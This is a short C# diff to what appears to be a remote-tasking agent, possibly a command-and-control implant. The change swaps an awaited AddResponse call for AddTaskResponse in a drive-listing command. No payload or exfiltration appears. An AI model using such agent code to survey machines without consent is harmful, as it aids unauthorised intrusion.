@@ -38,7 +38,7 @@ namespace Agent
                 {
                     output = getBasicOutput(DriveInfo.GetDrives());
                 }
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = output,
@@ -47,7 +47,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = e.ToString(),
